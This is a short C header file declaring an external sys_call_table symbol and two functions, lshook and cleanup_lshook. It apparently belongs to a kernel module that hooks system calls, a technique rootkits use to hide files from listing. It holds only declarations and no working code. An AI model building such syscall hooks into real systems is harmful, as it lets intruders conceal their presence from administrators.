#ifndef LSHOOK_H
#define LSHOOK_H

#include "utils.h"

extern unsigned long long sys_call_table;

void lshook(void);

void cleanup_lshook(void);

#endif